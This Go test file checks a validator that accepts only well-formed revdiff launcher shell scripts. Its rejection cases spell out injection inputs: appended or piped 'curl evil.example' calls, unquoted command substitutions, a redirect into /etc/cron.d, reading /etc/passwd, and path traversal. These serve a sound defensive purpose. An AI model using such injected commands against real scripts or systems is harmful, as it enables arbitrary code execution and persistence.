package cmdpattern

import (
	"strings"
	"testing"
)

const testBin = "/usr/local/bin/revdiff"

// revdiffScriptPattern mirrors what the revdiff tool declares in production.
func revdiffScriptPattern() ScriptPattern {
	return ScriptPattern{
		Shebangs:  []string{"#!/bin/sh"},
		Statement: CommandPattern{Program: "revdiff", ResolvedBin: testBin, ArgsMatcher: MatchAny()},
	}
}

// tail reproduces the launcher's write_rc_cmd output for a sentinel path:
//
//	printf '%s; rc=$?; printf "%%s" "$rc" > %s.tmp && mv -f %s.tmp %s'
func tail(sentinel string) string {
	q := "'" + sentinel + "'"
	return "; rc=$?; printf \"%s\" \"$rc\" > " + q + ".tmp && mv -f " + q + ".tmp " + q
}

func TestScriptPatternAcceptsLauncherBodies(t *testing.T) {
	p := revdiffScriptPattern()
	const sentinel = "/tmp/revdiff-done-xyz"

	tests := []struct {
		name string
		head string
	}{
		{
			name: "minimal form",
			head: "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + testBin + "' '--output=/tmp/revdiff-output-abc'",
		},
		{
			name: "with --config",
			head: "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + testBin + "' '--config=/home/u/.revdiff.yml' '--output=/tmp/o'",
		},
		{
			name: "with extra positional args",
			head: "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + testBin + "' '--output=/tmp/o' 'main' 'HEAD'",
		},
		{
			name: "with /usr/bin/env prefix",
			head: "/usr/bin/env 'EDITOR=nvim' 'VISUAL=nvim' REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + testBin + "' '--output=/tmp/o'",
		},
		{
			name: "no env assignment at all",
			head: "'" + testBin + "' '--output=/tmp/o'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body := "#!/bin/sh\n" + tt.head + tail(sentinel) + "\n"
			if !p.MatchesBody([]byte(body)) {
				t.Errorf("MatchesBody rejected a real launcher body:\n%s", body)
			}
		})
	}
}

func TestScriptPatternRejects(t *testing.T) {
	p := revdiffScriptPattern()
	const sentinel = "/tmp/revdiff-done-xyz"
	okHead := "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + testBin + "' '--output=/tmp/o'"

	tests := []struct {
		name string
		body string
	}{
		{
			name: "empty body",
			body: "",
		},
		{
			name: "missing shebang is fine but missing tail is not",
			body: okHead + "\n",
		},
		{
			name: "disallowed shebang",
			body: "#!/bin/bash\n" + okHead + tail(sentinel) + "\n",
		},
		{
			name: "second statement appended after the sentinel clause",
			body: "#!/bin/sh\n" + okHead + tail(sentinel) + "; curl evil.example\n",
		},
		{
			name: "second statement on its own line",
			body: "#!/bin/sh\n" + okHead + tail(sentinel) + "\ncurl evil.example\n",
		},
		{
			name: "unquoted command substitution in an argument",
			body: "#!/bin/sh\n" + "'" + testBin + "' --output=$(curl evil)" + tail(sentinel) + "\n",
		},
		{
			name: "unquoted backtick substitution in an argument",
			body: "#!/bin/sh\n" + "'" + testBin + "' --output=`curl evil`" + tail(sentinel) + "\n",
		},
		{
			name: "unquoted redirect appended to the head",
			body: "#!/bin/sh\n" + "'" + testBin + "' '--output=/tmp/o' > /etc/cron.d/x" + tail(sentinel) + "\n",
		},
		{
			name: "unquoted program",
			body: "#!/bin/sh\n" + "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true " + testBin + " '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			name: "program is not revdiff",
			body: "#!/bin/sh\n'/bin/cat' '/etc/passwd'" + tail(sentinel) + "\n",
		},
		{
			name: "revdiff by basename from another directory",
			body: "#!/bin/sh\n'/tmp/revdiff' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			name: "bare env instead of absolute /usr/bin/env",
			body: "#!/bin/sh\nenv 'EDITOR=nvim' '" + testBin + "' '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
		{
			name: "mismatched sentinel paths across the clause",
			body: "#!/bin/sh\n" + okHead +
				"; rc=$?; printf \"%s\" \"$rc\" > '/tmp/a'.tmp && mv -f '/tmp/b'.tmp '/tmp/a'\n",
		},
		{
			name: "relative sentinel path",
			body: "#!/bin/sh\n" + okHead + tail("tmp/relative") + "\n",
		},
		{
			name: "non-canonical sentinel path",
			body: "#!/bin/sh\n" + okHead + tail("/tmp/../etc/passwd") + "\n",
		},
		{
			name: "pipeline instead of the sentinel clause",
			body: "#!/bin/sh\n" + okHead + " | curl evil.example\n",
		},
		{
			name: "heredoc",
			body: "#!/bin/sh\ncat <<EOF\nevil\nEOF\n",
		},
		{
			name: "carriage returns",
			body: "#!/bin/sh\r\n" + okHead + tail(sentinel) + "\r\n",
		},
		{
			name: "null byte",
			body: "#!/bin/sh\n" + okHead + tail(sentinel) + "\x00",
		},
		{
			name: "quoted token concatenated with a bare suffix",
			body: "#!/bin/sh\n'" + testBin + "'evil '--output=/tmp/o'" + tail(sentinel) + "\n",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if p.MatchesBody([]byte(tt.body)) {
				t.Errorf("MatchesBody accepted a body it must reject:\n%q", tt.body)
			}
		})
	}
}

// TestScriptPatternAcceptsSubstitutionInsideSingleQuotes documents a
// deliberate allowance. `$(...)` and backticks are shell-significant only when
// unquoted or double-quoted; inside single quotes POSIX sh passes them through
// literally (verified against sh: `printf '%s' '$(echo X)'` prints `$(echo X)`).
// The bytes therefore reach revdiff as an ordinary argument and never reach a
// shell that would act on them, so rejecting them would add no safety while
// breaking legitimate paths and branch names. The unquoted forms above are
// rejected, which is where the real risk lives.
func TestScriptPatternAcceptsSubstitutionInsideSingleQuotes(t *testing.T) {
	p := revdiffScriptPattern()

	for _, arg := range []string{"--output=$(curl evil)", "--output=`curl evil`", "--output=/tmp/a;b"} {
		body := "#!/bin/sh\n'" + testBin + "' '" + arg + "'" + tail("/tmp/s") + "\n"
		if !p.MatchesBody([]byte(body)) {
			t.Errorf("MatchesBody rejected a safely single-quoted argument %q", arg)
		}
	}
}

func TestScriptPatternRejectsOversizedBody(t *testing.T) {
	p := revdiffScriptPattern()
	p.MaxBytes = 128

	body := "#!/bin/sh\n'" + testBin + "' '--output=" + strings.Repeat("a", 200) + "'" + tail("/tmp/s") + "\n"
	if p.MatchesBody([]byte(body)) {
		t.Error("MatchesBody accepted a body exceeding MaxBytes, want rejected")
	}
}

// TestScriptPatternRejectsSmuggledTail guards the head/tail split. Splitting on
// the first "; rc=" means an argument containing that text truncates the head
// mid-quote, which must fail closed rather than let the real tail through.
func TestScriptPatternRejectsSmuggledTail(t *testing.T) {
	p := revdiffScriptPattern()
	sentinel := "/tmp/revdiff-done-xyz"

	body := "#!/bin/sh\n'" + testBin + "' '--output=/tmp/o; rc=1' 'x'" + tail(sentinel) + "\n"
	if p.MatchesBody([]byte(body)) {
		t.Error("MatchesBody accepted a body with a smuggled '; rc=' inside an argument, want rejected")
	}
}

func TestScriptPatternNoShebangAllowed(t *testing.T) {
	p := revdiffScriptPattern()
	body := "'" + testBin + "' '--output=/tmp/o'" + tail("/tmp/s") + "\n"
	if !p.MatchesBody([]byte(body)) {
		t.Error("MatchesBody rejected a shebang-less body whose single statement is valid, want accepted")
	}
}
